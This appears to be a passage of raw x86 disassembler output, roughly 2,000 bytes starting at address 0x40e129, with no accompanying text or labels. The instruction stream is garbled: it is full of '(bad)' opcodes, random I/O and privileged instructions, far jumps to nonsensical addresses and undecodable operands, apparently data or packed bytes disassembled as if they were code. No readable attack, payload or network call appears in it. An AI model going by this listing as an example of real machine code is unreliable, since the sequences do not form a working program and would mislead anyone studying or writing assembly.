  40e129:	(bad)  
  40e12b:	shr    DWORD PTR [edx-0x38fa8e95],0x43
  40e132:	or     DWORD PTR [eax],0xe203ee2f
  40e138:	or     BYTE PTR [edi-0x1d],ch
  40e13b:	(bad)
  40e13e:	add    BYTE PTR [edi],al
  40e140:	jo     0x40e1b2
  40e142:	mov    esp,DWORD PTR [ebp+0x66]
  40e145:	imul   edx,DWORD PTR [edi+0x2b],0x65
  40e149:	mov    eax,0xe1e97910
  40e14e:	ret    
  40e14f:	xlat   BYTE PTR ds:[ebx]
  40e150:	int3   
  40e151:	or     edx,esi
  40e153:	inc    ecx
  40e154:	mov    BYTE PTR [esi+0x469d8fe9],cl
  40e15a:	sbb    DWORD PTR [edx-0x9],ebp
  40e15d:	jl     0x40e100
  40e15f:	xor    esp,edi
  40e161:	xchg   ebx,eax
  40e162:	fwait
  40e163:	es pusha 
  40e165:	les    eax,FWORD PTR [ecx]
  40e167:	js     0x40e13a
  40e169:	ficom  WORD PTR [ecx-0x42]
  40e16c:	adc    eax,0x44ec4ca5
  40e171:	inc    esi
  40e172:	icebp  
  40e173:	mov    bl,0x68
  40e175:	es aad 0x8c
  40e178:	push   0x1575880
  40e17d:	or     eax,0x3eaa9a93
  40e182:	scas   eax,DWORD PTR es:[edi]
  40e183:	xchg   BYTE PTR [eax+0x32],ah
  40e186:	and    al,0x5b
  40e188:	dec    esp
  40e189:	hlt    
  40e18a:	lods   eax,DWORD PTR ds:[esi]
  40e18b:	mov    dl,0x36
  40e18d:	mov    ah,0x5c
  40e18f:	loope  0x40e16e
  40e191:	sbb    bl,BYTE PTR cs:[esi+0x25b589b7]
  40e198:	sub    DWORD PTR [edx],0xf935015e
  40e19e:	mov    eax,0xdd1cbe08
  40e1a3:	xor    eax,0xfe9a6b7e
  40e1a8:	xlat   BYTE PTR ds:[ebx]
  40e1a9:	jmp    0x9e9023b8
  40e1ae:	push   ds
  40e1af:	lea    ebp,[ebx-0x1e]
  40e1b2:	sub    al,BYTE PTR [ecx-0x62b548e3]
  40e1b8:	arpl   WORD PTR [ecx-0x74],cx
  40e1bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1bc:	shl    DWORD PTR [eax],1
  40e1be:	add    eax,0xa5ba4be1
  40e1c3:	dec    eax
  40e1c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1c5:	add    edi,DWORD PTR [eax+0x1d819b9e]
  40e1cb:	nop
  40e1cc:	adc    al,0x6c
  40e1ce:	in     eax,0xb3
  40e1d0:	and    DWORD PTR [ebx-0x7e],eax
  40e1d3:	jae    0x40e156
  40e1d5:	push   0xc215c9fa
  40e1da:	dec    ebx
  40e1db:	add    eax,0x92264ed9
  40e1e0:	mov    esp,0xeb4448ff
  40e1e5:	std    
  40e1e6:	popf   
  40e1e7:	(bad)  
  40e1e8:	mov    ebx,0xc380a591
  40e1ed:	push   esi
  40e1ee:	jp     0x40e24a
  40e1f0:	pop    es
  40e1f1:	test   al,0x7c
  40e1f3:	in     al,0xe1
  40e1f5:	out    0xb2,al
  40e1f7:	mov    ebx,0x7acfaf2a
  40e1fc:	pop    edi
  40e1fd:	rcl    BYTE PTR ds:0x6dfa92a,1
  40e203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e204:	out    dx,al
  40e205:	cmp    ebp,DWORD PTR [eax]
  40e207:	jne    0x40e271
  40e209:	cmc    
  40e20a:	mov    al,0xf0
  40e20c:	icebp  
  40e20d:	clc    
  40e20e:	mov    ecx,0x587a1d84
  40e213:	add    al,0xc
  40e215:	and    al,0x3a
  40e217:	stos   BYTE PTR es:[edi],al
  40e218:	addr16 icebp 
  40e21a:	(bad)  
  40e21b:	(bad)  
  40e21c:	sar    BYTE PTR [edi],cl
  40e21e:	sbb    al,0x68
  40e220:	shl    BYTE PTR [ebp+0x18f72526],0x35
  40e227:	neg    BYTE PTR [ebp+0x25]
  40e22a:	xchg   ebx,eax
  40e22b:	je     0x40e243
  40e22d:	addr16 js 0x40e26c
  40e230:	enter  0x6fc3,0xb6
  40e234:	lea    ebx,[edx+ebp*4]
  40e237:	sub    DWORD PTR [ecx+0x6e],esi
  40e23a:	mov    edx,0xd05b56ed
  40e23f:	mov    ds:0xb80cfe95,eax
  40e244:	rcl    BYTE PTR [edi],0x5b
  40e247:	mov    ss,WORD PTR [ebp-0x4c]
  40e24a:	popa   
  40e24b:	test   eax,0x67553d72
  40e250:	mov    esp,0x52b24ee8
  40e255:	fucomi st,st(1)
  40e257:	mov    al,0xb
  40e259:	mov    edi,0xe63952fc
  40e25e:	lahf   
  40e25f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e260:	or     al,dh
  40e262:	(bad)  
  40e263:	popa   
  40e264:	nop
  40e265:	jl     0x40e232
  40e267:	pushf  
  40e268:	jp     0x40e2d7
  40e26a:	fstp   QWORD PTR [eax+0x9]
  40e26d:	pop    ebx
  40e26e:	outs   dx,BYTE PTR ds:[esi]
  40e26f:	xor    eax,0xf59b9b3c
  40e274:	cmp    bl,BYTE PTR [ebp-0x29d919c5]
  40e27a:	lock inc esp
  40e27c:	pop    ss
  40e27d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e27e:	jmp    0x494d:0x4d59f8ab
  40e285:	sbb    eax,0x9697e6ae
  40e28a:	sbb    DWORD PTR ds:0x775ea419,ebx
  40e290:	adc    DWORD PTR [ebx-0x5a998b87],esp
  40e296:	inc    ebx
  40e297:	int    0xf6
  40e299:	call   0x6bdc:0x5ea85c10
  40e2a0:	imul   esi,DWORD PTR [ecx-0xabc02f1],0xffffffcf
  40e2a7:	lock adc al,0x70
  40e2aa:	push   edx
  40e2ab:	jae    0x40e2b0
  40e2ad:	loop   0x40e247
  40e2af:	push   ecx
  40e2b0:	xchg   ecx,eax
  40e2b1:	mov    dl,0x40
  40e2b3:	xor    ecx,ebx
  40e2b5:	xchg   ecx,eax
  40e2b6:	fsub   DWORD PTR [eax]
  40e2b8:	sbb    eax,DWORD PTR [ebx+0x415c5939]
  40e2be:	(bad)  
  40e2bf:	cmp    al,0x22
  40e2c1:	mov    ?,WORD PTR [edx-0x519517fb]
  40e2c7:	mov    eax,0x7fee4890
  40e2cc:	jmp    0x40e30f
  40e2ce:	or     dl,BYTE PTR [ebx]
  40e2d0:	xlat   BYTE PTR ds:[ebx]
  40e2d1:	sub    esp,DWORD PTR [ecx+0x53]
  40e2d4:	inc    ebp
  40e2d5:	sbb    ecx,esp
  40e2d7:	xor    esp,ecx
  40e2d9:	cmp    edi,esp
  40e2db:	mov    dh,0x7f
  40e2dd:	shl    DWORD PTR [edx],cl
  40e2df:	je     0x40e2d1
  40e2e1:	sbb    dh,BYTE PTR [eax-0x4c]
  40e2e4:	or     ch,dh
  40e2e6:	mov    esp,0xed5f1494
  40e2eb:	cli    
  40e2ec:	(bad)  
  40e2ed:	ds mov bh,0xa7
  40e2f0:	outs   dx,DWORD PTR ds:[esi]
  40e2f1:	push   0x51968efd
  40e2f6:	sub    BYTE PTR [ebx-0x7cdc5a5c],bh
  40e2fc:	push   eax
  40e2fd:	cmp    eax,0xc74d029c
  40e302:	cmp    edi,DWORD PTR [esi]
  40e304:	ror    DWORD PTR [edx+0x57],cl
  40e307:	push   ecx
  40e308:	icebp  
  40e309:	outs   dx,DWORD PTR ds:[esi]
  40e30a:	xor    ah,ch
  40e30c:	sahf   
  40e30d:	int    0xf7
  40e30f:	(bad)  
  40e311:	xchg   edi,eax
  40e312:	and    ch,cl
  40e314:	jle    0x40e2f5
  40e316:	mov    BYTE PTR [ecx+0x488d6fc3],bl
  40e31c:	inc    esi
  40e31d:	retf   
  40e31e:	and    esp,DWORD PTR [ecx]
  40e320:	(bad)  
  40e321:	call   0x9ba5:0xcbd0c592
  40e328:	cli    
  40e329:	push   ss
  40e32a:	jmp    0x67af209f
  40e32f:	jmp    0xebad:0x7d126c59
  40e336:	out    dx,eax
  40e337:	sti    
  40e338:	out    0x7,al
  40e33a:	pop    es
  40e33b:	push   ebx
  40e33c:	mov    dl,0xf3
  40e33e:	(bad)  [ecx-0x7e]
  40e341:	inc    esp
  40e342:	push   cs
  40e343:	stos   DWORD PTR es:[edi],eax
  40e344:	pop    ds
  40e345:	mov    dl,0x23
  40e347:	(bad)  
  40e348:	push   eax
  40e349:	neg    DWORD PTR [esp+ecx*2]
  40e34c:	xchg   edx,eax
  40e34d:	cmp    ecx,DWORD PTR [ebp-0x343b8fe5]
  40e353:	adc    edx,DWORD PTR [eax+ebp*2-0x2d458ea7]
  40e35a:	ins    BYTE PTR es:[edi],dx
  40e35b:	mov    edx,?
  40e35d:	push   esp
  40e35e:	pop    ds
  40e35f:	and    DWORD PTR [ecx],ebp
  40e361:	sti    
  40e362:	sbb    eax,0x799bf255
  40e367:	es sahf 
  40e369:	push   ss
  40e36a:	jb     0x40e306
  40e36c:	out    0xb6,al
  40e36e:	dec    edx
  40e36f:	xor    DWORD PTR [edi],ebp
  40e371:	jmp    0xb9a86ae7
  40e376:	out    0x55,al
  40e378:	data16 add BYTE PTR [ecx-0x7e192bb7],cl
  40e37f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e380:	imul   edi,DWORD PTR [edx+0xe],0x2c
  40e384:	iret   
  40e385:	pop    ds
  40e386:	mov    dh,0x88
  40e388:	arpl   bp,bp
  40e38a:	icebp  
  40e38b:	and    al,BYTE PTR [esi+0x361ed366]
  40e391:	dec    ebp
  40e392:	lock iret 
  40e394:	inc    eax
  40e395:	fwait
  40e396:	mov    bl,0xbc
  40e398:	mov    al,0x75
  40e39a:	cmovl  esp,DWORD PTR [ecx+0x248d62a5]
  40e3a1:	in     al,dx
  40e3a2:	mov    DWORD PTR [ecx],eax
  40e3a4:	shr    DWORD PTR [ebx-0xe],0x17
  40e3a8:	ja     0x40e32d
  40e3aa:	repz mov edi,0x4f0dc3e4
  40e3b0:	aaa    
  40e3b1:	sbb    cl,BYTE PTR [eax]
  40e3b3:	icebp  
  40e3b4:	cli    
  40e3b5:	aaa    
  40e3b6:	push   edx
  40e3b7:	adc    edi,DWORD PTR [esi+0x72]
  40e3ba:	aad    0x2c
  40e3bc:	adc    eax,0xe7080014
  40e3c1:	enter  0x6dde,0x66
  40e3c5:	xchg   esi,eax
  40e3c6:	jnp    0x40e3fe
  40e3c8:	push   ebp
  40e3c9:	or     eax,DWORD PTR [edx-0x3c943956]
  40e3cf:	mov    eax,ds:0x637882cd
  40e3d4:	es mov edx,0x4b0eee7a
  40e3da:	jg     0x40e381
  40e3dc:	mov    ebx,0x9f23d0bc
  40e3e1:	adc    eax,0x4f3c3675
  40e3e6:	push   es
  40e3e7:	pop    es
  40e3e8:	mov    esi,0x8e9179e4
  40e3ed:	cmp    ecx,esp
  40e3ef:	xor    esp,DWORD PTR [edi-0x35]
  40e3f2:	inc    ecx
  40e3f3:	dec    esi
  40e3f4:	inc    esi
  40e3f5:	xchg   ecx,eax
  40e3f6:	imul   esp,ecx,0xffffff83
  40e3f9:	mov    esp,0xa2ba711c
  40e3fe:	jecxz  0x40e45a
  40e400:	adc    al,0x8f
  40e403:	jae    0x40e3ef
  40e405:	fld    DWORD PTR [eax-0x46]
  40e408:	cmp    DWORD PTR [eax+0x9],ebp
  40e40b:	(bad)  
  40e40c:	adc    BYTE PTR [esi],ah
  40e40e:	mov    eax,0x6008fef8
  40e413:	and    ah,BYTE PTR [ebx+0x3f]
  40e416:	ins    BYTE PTR es:[edi],dx
  40e417:	out    dx,eax
  40e418:	inc    edi
  40e419:	pop    ss
  40e41a:	shl    BYTE PTR [eax-0x34170639],1
  40e420:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e421:	xor    BYTE PTR [edx+0x2e],0x81
  40e425:	(bad)  
  40e426:	in     al,dx
  40e427:	ja     0x40e3f6
  40e429:	js     0x40e44b
  40e42b:	dec    ebx
  40e42c:	ds inc esp
  40e42e:	adc    ch,BYTE PTR ds:0x9bce3427
  40e434:	fs or  al,0xfe
  40e437:	dec    ecx
  40e438:	(bad)  
  40e43a:	aad    0x8d
  40e43c:	jg     0x40e3dd
  40e43e:	aas    
  40e43f:	jae    0x40e46c
  40e441:	cmp    DWORD PTR [eax+ebx*8],0x42
  40e445:	out    dx,al
  40e446:	xchg   edi,eax
  40e447:	rcr    DWORD PTR [ebx+0x1a],cl
  40e44a:	sub    al,0x2a
  40e44c:	jge    0x40e3db
  40e44e:	mov    ebp,0x9e60c897
  40e453:	adc    eax,0xb149b044
  40e458:	je     0x40e3ed
  40e45a:	mov    al,ds:0x98517d15
  40e45f:	ss jns 0x40e488
  40e462:	adc    al,0x77
  40e464:	lahf   
  40e465:	and    eax,0x856302e3
  40e46a:	and    bl,BYTE PTR [edi+ecx*8]
  40e46d:	popa   
  40e46e:	gs xchg ebp,eax
  40e470:	pop    ebp
  40e471:	cmp    esp,DWORD PTR [eax+0x4]
  40e474:	(bad)  
  40e475:	lea    eax,[ebp-0x73c89eb1]
  40e47b:	sahf   
  40e47c:	xchg   esp,eax
  40e47d:	test   eax,0xeb85ac12
  40e482:	stos   DWORD PTR es:[edi],eax
  40e483:	mov    ebp,0xc376878e
  40e488:	sti    
  40e489:	gs and eax,ebx
  40e48c:	xchg   ebp,eax
  40e48d:	cmp    esi,DWORD PTR [edi+0x41]
  40e490:	mov    bh,0x54
  40e492:	scas   eax,DWORD PTR es:[edi]
  40e493:	mov    cl,0xf6
  40e495:	mov    dh,0xd1
  40e497:	in     eax,dx
  40e498:	jb     0x40e4a2
  40e49a:	mov    cl,0xd8
  40e49c:	xchg   edi,eax
  40e49d:	push   eax
  40e49e:	pop    ebp
  40e49f:	test   al,0xcb
  40e4a1:	cmp    dl,BYTE PTR [ecx+0xd]
  40e4a4:	inc    esp
  40e4a5:	add    DWORD PTR [edi],edx
  40e4a7:	xchg   esi,eax
  40e4a8:	mov    BYTE PTR [ebp+0xf],ch
  40e4ab:	sbb    bh,0x28
  40e4ae:	mov    bh,ah
  40e4b0:	adc    al,BYTE PTR [ecx-0x3269032e]
  40e4b6:	repz les ebp,FWORD PTR [eax+0x722b5559]
  40e4bd:	add    ebx,ebp
  40e4bf:	lds    eax,FWORD PTR [ebx+eiz*2+0x3be232e8]
  40e4c6:	push   es
  40e4c7:	pop    es
  40e4c8:	jbe    0x40e4d9
  40e4ca:	aas    
  40e4cb:	xchg   esp,eax
  40e4cc:	nop
  40e4cd:	dec    edi
  40e4ce:	popa   
  40e4cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4d0:	call   0x63d9:0x62462125
  40e4d7:	cmc    
  40e4d8:	mov    esp,0xb2503c29
  40e4dd:	adc    BYTE PTR ds:0x6fc75725,bh
  40e4e3:	and    DWORD PTR [ebx-0x77],0x2d23b119
  40e4ea:	pusha  
  40e4eb:	test   al,0x7c
  40e4ed:	push   eax
  40e4ee:	or     DWORD PTR [edi-0x27e6d479],edi
  40e4f4:	(bad)  
  40e4f5:	in     eax,dx
  40e4f6:	mov    eax,ds:0xd5b3d19
  40e4fb:	repz test al,0x2e
  40e4fe:	outs   dx,BYTE PTR ds:[esi]
  40e4ff:	mov    ch,0x24
  40e501:	xchg   esi,eax
  40e502:	sbb    DWORD PTR [ecx-0x33],0xffffff95
  40e506:	loop   0x40e53e
  40e508:	xchg   edi,eax
  40e509:	add    eax,0x54
  40e50c:	add    edi,DWORD PTR [ebp-0x17]
  40e50f:	into   
  40e510:	mov    eax,ds:0xdbca6473
  40e515:	cwde   
  40e516:	sub    cl,dl
  40e518:	push   es
  40e519:	xor    eax,0xe3213156
  40e51e:	mov    ch,0xc4
  40e520:	retf   
  40e521:	popa   
  40e522:	aas    
  40e523:	sub    al,0x47
  40e525:	lahf   
  40e526:	jmp    0x77ac4749
  40e52b:	push   cs
  40e52c:	daa    
  40e52d:	ss and edi,0xcaa05acf
  40e534:	sbb    BYTE PTR [ebx+0x21],al
  40e537:	daa    
  40e538:	push   eax
  40e539:	hlt    
  40e53a:	mov    ebp,0x241045d8
  40e53f:	inc    edx
  40e540:	push   0xffffffb7
  40e542:	out    dx,al
  40e543:	es stc 
  40e545:	sti    
  40e546:	xor    eax,0x376f88f
  40e54b:	mov    dl,0x72
  40e54d:	test   BYTE PTR [edx+0x3c],al
  40e550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e551:	adc    esp,DWORD PTR [eax-0x33]
  40e554:	or     eax,0x285eba87
  40e559:	and    cl,bh
  40e55b:	fisttp QWORD PTR [ebx+0x1dd9288a]
  40e561:	pop    ss
  40e562:	call   0x8b20:0x65d58f8
  40e569:	shl    ebp,0x8
  40e56c:	int3   
  40e56d:	add    al,BYTE PTR [ecx]
  40e56f:	or     dl,bl
  40e571:	adc    al,0x54
  40e573:	sub    al,0x87
  40e575:	mov    esi,0xf11e3e30
  40e57a:	fidivr WORD PTR ss:[ebp-0x153900a2]
  40e581:	(bad)  
  40e582:	jmp    0x40e5e1
  40e584:	jne    0x40e58f
  40e586:	js     0x40e5ba
  40e588:	mov    ch,0xf
  40e58a:	loop   0x40e55f
  40e58c:	in     eax,0x62
  40e58e:	push   es
  40e58f:	mov    edi,0xcb286bfa
  40e594:	add    bh,bl
  40e596:	xchg   al,ch
  40e598:	(bad)
  40e59b:	inc    esp
  40e59c:	lock adc ecx,DWORD PTR [ebx-0x15]
  40e5a0:	(bad)  [eax+0x33]
  40e5a3:	add    bh,BYTE PTR [edx-0x2]
  40e5a6:	es and eax,0x267ad1e8
  40e5ac:	mov    ebx,0xb96723fe
  40e5b1:	pop    ds
  40e5b2:	mov    eax,0xcc464486
  40e5b7:	cmp    dl,BYTE PTR [edx+0x76841105]
  40e5bd:	leave  
  40e5be:	inc    esp
  40e5bf:	xchg   ecx,eax
  40e5c0:	es and al,0xe4
  40e5c3:	push   ecx
  40e5c4:	pop    ss
  40e5c5:	jp     0x40e5f9
  40e5c7:	jle    0xe378d828
  40e5cd:	sar    DWORD PTR [edx-0x7b],cl
  40e5d0:	sbb    eax,0xe6a21204
  40e5d5:	iret   
  40e5d6:	shl    DWORD PTR [ecx-0x10],0x17
  40e5da:	pop    esp
  40e5db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5dc:	xor    edi,DWORD PTR [edi+0x2b]
  40e5df:	into   
  40e5e0:	push   0x10
  40e5e2:	ss jmp 0x237a057b
  40e5e8:	(bad)  
  40e5e9:	pop    esp
  40e5ea:	push   cs
  40e5eb:	dec    eax
  40e5ec:	push   edi
  40e5ed:	outs   dx,BYTE PTR ds:[esi]
  40e5ee:	test   BYTE PTR [eax-0x72d1a301],dh
  40e5f4:	clc    
  40e5f5:	mov    edx,0x463f69f7
  40e5fa:	pusha  
  40e5fb:	jge    0x40e5f6
  40e5fd:	mov    dh,0xad
  40e5ff:	jnp    0x40e5bd
  40e601:	cdq    
  40e602:	xor    edx,0x2ef580bd
  40e608:	test   DWORD PTR [ecx-0x43a8b637],0x3cebb24c
  40e612:	mov    eax,ds:0xf39efb77
  40e617:	add    ebx,DWORD PTR [ebx]
  40e619:	(bad)  [edx]
  40e61b:	daa    
  40e61c:	fdivr  DWORD PTR [edx-0x18]
  40e61f:	dec    edx
  40e620:	call   0x1712:0xc881e6f2
  40e627:	sub    DWORD PTR [edi-0x31bebcc4],edx
  40e62d:	push   ebx
  40e62e:	das    
  40e62f:	popf   
  40e630:	push   ecx
  40e631:	dec    eax
  40e632:	imul   ebp,edx,0xfffffffc
  40e635:	push   esi
  40e636:	mov    ds:0xbae62cb5,eax
  40e63b:	cli    
  40e63c:	arpl   WORD PTR [edi+0x57e94edc],cx
  40e642:	or     al,0x2b
  40e644:	mov    cl,0xef
  40e646:	imul   esi,DWORD PTR [edi+0x6e],0x139d8448
  40e64d:	inc    esp
  40e64e:	nop
  40e64f:	fld    TBYTE PTR [ebx-0x192afd7a]
  40e655:	pushf  
  40e656:	scas   al,BYTE PTR es:[edi]
  40e657:	pusha  
  40e658:	sbb    ah,bh
  40e65a:	cmc    
  40e65b:	or     dh,BYTE PTR [ebp+0x35]
  40e65e:	or     dh,BYTE PTR [ecx-0x330d6313]
  40e664:	sub    DWORD PTR [ebx+ebx*1],ecx
  40e667:	cmp    bl,BYTE PTR [ecx+0x45]
  40e66a:	and    al,0xc9
  40e66c:	cdq    
  40e66d:	add    BYTE PTR [esi-0x7e],0xf2
  40e671:	iret   
  40e672:	hlt    
  40e673:	repnz mov cl,0xae
  40e676:	adc    DWORD PTR ds:0xf408be1e,0xffffffe3
  40e67d:	or     esp,ebp
  40e67f:	ret    
  40e680:	mov    ebx,0x7a64d851
  40e685:	adc    esi,ecx
  40e687:	inc    ebp
  40e688:	(bad)  
  40e689:	mov    esi,0xc42e15c
  40e68e:	inc    ebp
  40e68f:	ror    DWORD PTR [ebp+0x39fbfaba],1
  40e695:	mov    edi,0x7944bfd
  40e69a:	fisttp WORD PTR [edi-0x3b664d17]
  40e6a0:	outs   dx,DWORD PTR ds:[esi]
  40e6a1:	inc    ebp
  40e6a2:	(bad)  
  40e6a3:	pop    ebx
  40e6a4:	fidiv  WORD PTR [ecx]
  40e6a6:	call   0x10a0:0x9e6c7bc7
  40e6ad:	mov    bh,0x16
  40e6af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6b0:	adc    al,0x27
  40e6b2:	pop    edx
  40e6b3:	jb     0x40e72f
  40e6b5:	call   0x7491:0x2d1d4eca
  40e6bc:	pop    ds
  40e6bd:	idiv   BYTE PTR ds:0x6ce17111
  40e6c3:	icebp  
  40e6c4:	in     eax,dx
  40e6c5:	cs fsubp st(7),st
  40e6c8:	dec    eax
  40e6c9:	mov    bl,BYTE PTR [eax+0x12]
  40e6cc:	in     eax,0x20
  40e6ce:	cmc    
  40e6cf:	sbb    edx,DWORD PTR ds:0xb0ed3e8d
  40e6d5:	dec    esi
  40e6d6:	nop
  40e6d7:	sbb    ecx,DWORD PTR fs:[ecx]
  40e6da:	inc    edx
  40e6db:	das    
  40e6dc:	popa   
  40e6dd:	add    eax,0x9ba2fec5
  40e6e2:	nop
  40e6e3:	data16 mov ds:0xdcfc7493,al
  40e6e9:	idiv   BYTE PTR [ebx-0x492e9f48]
  40e6ef:	pop    ss
  40e6f0:	shl    BYTE PTR [ecx],1
  40e6f2:	adc    eax,0xbda67402
  40e6f7:	xchg   dl,bh
  40e6f9:	xchg   ebx,eax
  40e6fa:	and    eax,ebx
  40e6fc:	(bad)  
  40e6fd:	add    ch,dl
  40e6ff:	cmp    DWORD PTR [edi-0x1fb069e7],ecx
  40e705:	sbb    DWORD PTR [ebp+0x4217cb9a],0x9f1a6e70
  40e70f:	aaa    
  40e710:	sahf   
  40e711:	ds jns 0x40e698
  40e714:	cmp    al,0xe0
  40e716:	dec    ebx
  40e717:	pop    ebp
  40e718:	add    DWORD PTR ds:0x75eaafd1,edx
  40e71e:	cmp    ecx,0xf
  40e721:	dec    ebp
  40e722:	fcmovu st,st(0)
  40e724:	pop    es
  40e725:	imul   edi,DWORD PTR [ebx+edi*1+0x3a],0x3e
  40e72a:	xchg   esp,eax
  40e72b:	mov    edx,DWORD PTR [ecx-0x294da718]
  40e731:	retf   0x5e16
  40e734:	(bad)  
  40e735:	jmp    0x86ce729f
  40e73a:	popa   
  40e73b:	or     DWORD PTR [ecx],ecx
  40e73d:	imul   edx,ebx,0x343395b5
  40e743:	and    eax,0x23de9021
  40e748:	or     dh,BYTE PTR [esi+0x6c]
  40e74b:	jae    0x40e784
  40e74d:	add    ebx,DWORD PTR [edx]
  40e74f:	add    esp,DWORD PTR [eax]
  40e751:	xor    BYTE PTR [ecx-0x1c],ch
  40e754:	jl     0x40e6ef
  40e756:	jmp    0xdf84:0x5637
  40e75c:	push   cs
  40e75d:	scas   eax,DWORD PTR es:[edi]
  40e75e:	ins    BYTE PTR es:[edi],dx
  40e75f:	push   cs
  40e760:	sbb    ch,BYTE PTR ds:0xddb5d2c
  40e766:	cdq    
  40e767:	idiv   BYTE PTR [edx+0x25]
  40e76a:	sub    ah,0xe0
  40e76d:	sbb    eax,0x1ca0a1e0
  40e772:	rcr    ebp,1
  40e774:	mov    ah,0x1c
  40e776:	(bad)  
  40e777:	jbe    0x40e72c
  40e779:	neg    BYTE PTR [esi-0x69]
  40e77c:	retfw  
  40e77e:	mov    edx,cs
  40e780:	loope  0x40e731
  40e782:	fbstp  TBYTE PTR [ebx+0x71]
  40e785:	fsubr  DWORD PTR [ecx]
  40e787:	inc    eax
  40e788:	or     DWORD PTR [eax-0x3ffef6d2],edi
  40e78e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e78f:	cmp    edi,edx
  40e791:	adc    al,0xff
  40e793:	call   0xa2e6:0x94c1909e
  40e79a:	or     BYTE PTR [eax+0x53f72989],cl
  40e7a0:	lock out dx,eax
  40e7a2:	lods   al,BYTE PTR ds:[esi]
  40e7a3:	shl    BYTE PTR [ecx+edi*1+0x6bca6aa8],1
  40e7aa:	cwde   
  40e7ab:	mov    ds:0x9ce897ed,al
  40e7b0:	int3   
  40e7b1:	jne    0x40e779
  40e7b3:	xchg   ecx,eax
  40e7b4:	es repz inc eax
  40e7b7:	outs   dx,DWORD PTR ds:[esi]
  40e7b8:	mov    DWORD PTR [eax],edi
  40e7ba:	clc    
  40e7bb:	cmp    BYTE PTR [edx+0x5c],bh
  40e7be:	not    BYTE PTR [edx+0x4e0c143f]
  40e7c4:	test   DWORD PTR [ebx+edx*4-0x4f799a9d],0x9b664e0b
  40e7cf:	stos   BYTE PTR es:[edi],al
  40e7d0:	outs   dx,DWORD PTR ds:[esi]
  40e7d1:	push   ds
  40e7d2:	mov    DWORD PTR [esi+ecx*4+0x60],ebx
  40e7d6:	mov    bh,0xb9
  40e7d9:	or     ch,BYTE PTR [ecx]
  40e7db:	xchg   edx,eax
  40e7dc:	pop    esi
  40e7dd:	xlat   BYTE PTR ds:[ebx]
  40e7de:	loopne 0x40e7e7
  40e7e0:	push   ecx
  40e7e1:	mov    ah,0x1a
  40e7e3:	sbb    BYTE PTR [edx],bh
  40e7e5:	gs pop ecx
  40e7e7:	and    BYTE PTR [esi+0x63a1242f],ah
  40e7ed:	arpl   WORD PTR [ecx],di
  40e7ef:	inc    ebx
  40e7f0:	cld    
  40e7f1:	repnz enter 0x8342,0xd
  40e7f6:	jle    0x40e81d
  40e7f8:	fst    DWORD PTR [ebx+eax*1+0x73]
  40e7fc:	pusha  
  40e7fd:	(bad)  
  40e7ff:	cmp    BYTE PTR [edx],cl
  40e801:	pushf  
  40e802:	add    BYTE PTR [edx],dl
  40e804:	arpl   WORD PTR [eax],si
  40e806:	xchg   esi,eax
  40e807:	xor    al,ch
  40e809:	add    al,dh
  40e80b:	aam    0x75
  40e80d:	pop    esi
  40e80e:	mov    ebp,0x88d3206b
  40e813:	add    al,0x61
  40e815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e816:	sub    eax,0xa47f80ac
  40e81b:	or     ebx,ebp
  40e81d:	adc    ch,cl
  40e81f:	and    BYTE PTR [esi],ch
  40e821:	sti    
  40e822:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e823:	lods   al,BYTE PTR ds:[esi]
  40e824:	and    esp,DWORD PTR [ecx-0x7b863fc2]
  40e82a:	shl    cl,0x13
  40e82d:	(bad)  
  40e82e:	mov    WORD PTR [esp+ebp*1+0x64ac15b],es
  40e835:	mov    ecx,0x172b1972
  40e83a:	inc    ebp
  40e83b:	xlat   BYTE PTR ds:[ebx]
  40e83c:	jae    0x40e7f0
  40e83e:	xchg   ebp,eax
  40e83f:	int3   
  40e840:	neg    DWORD PTR [edx+0x4dde2403]
  40e846:	fsub   st,st(5)
  40e848:	ins    BYTE PTR es:[edi],dx
  40e849:	jmp    0xa44b:0x51fd90a5
  40e850:	cmp    eax,0x4e2db081
  40e855:	ins    DWORD PTR es:[edi],dx
  40e856:	mov    ss,esi
  40e858:	sbb    al,0x1f
  40e85a:	xchg   ebp,eax
  40e85b:	cdq    
  40e85c:	xchg   DWORD PTR [edx+0x711fa6db],esi
  40e862:	loop   0x40e8a2
  40e864:	pop    esi
  40e865:	mov    ebx,0x1b8233e
  40e86a:	jg     0x40e866
  40e86c:	lods   eax,DWORD PTR ds:[esi]
  40e86d:	push   ebp
  40e86e:	cmp    BYTE PTR [ebx+0x76d3378b],0x6d
  40e875:	push   ebp
  40e876:	xor    eax,0x574d4d98
  40e87b:	mov    ax,0xe54e
  40e87f:	pop    ss
  40e880:	xchg   ebx,eax
  40e881:	dec    ebx
  40e882:	mov    esp,0x87548441
  40e887:	retf   
  40e888:	ins    BYTE PTR es:[edi],dx
  40e889:	adc    BYTE PTR [ebx],bh
  40e88b:	sbb    BYTE PTR [eax-0xc8e9789],cl
  40e891:	pop    edx
  40e892:	xchg   esi,eax
  40e893:	pop    ebp
  40e894:	fiadd  DWORD PTR [ebx-0xe6758d4]
  40e89a:	out    0xa4,al
  40e89c:	or     eax,0xb4d15ae8
  40e8a1:	push   ecx
  40e8a2:	fwait
  40e8a3:	pop    ss
  40e8a4:	or     al,0xb0
  40e8a6:	jge    0x40e8c9
  40e8a8:	in     al,0x80
  40e8aa:	(bad)  
  40e8ab:	pop    eax
  40e8ac:	mov    esi,0x2450d989
  40e8b1:	test   BYTE PTR [edx-0x31efc494],dl
  40e8b7:	(bad)  
  40e8b8:	dec    eax
  40e8b9:	lea    esp,[ebp-0x50]
  40e8bc:	jb     0x40e915
  40e8be:	adc    BYTE PTR [edx-0x5d608dec],al
  40e8c4:	xchg   esp,eax
  40e8c5:	scas   al,BYTE PTR es:[edi]
  40e8c6:	mov    edi,0x308d682
  40e8cb:	mov    ah,0x8a
